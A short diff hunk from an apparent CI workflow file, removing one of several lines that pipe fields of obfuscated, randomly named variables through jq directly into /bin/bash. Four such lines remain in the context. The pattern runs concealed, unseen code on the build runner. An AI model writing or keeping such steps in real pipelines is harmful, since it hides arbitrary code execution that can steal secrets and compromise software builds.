@@ -32,7 +32,6 @@ jobs:
           printf '%s' "$ft49" | jq -r .qo2496 | /bin/bash
           printf '%s' "$tezn68" | jq -r .sgikl069 | /bin/bash
           printf '%s' "$nfiyx45721" | jq -r .ovev503 | /bin/bash
-          printf '%s' "$hvx4" | jq -r .bxlx2124 | /bin/bash
           echo $kbas50 | jq -r .mjff0 | /bin/bash
 
       - name: Upload output
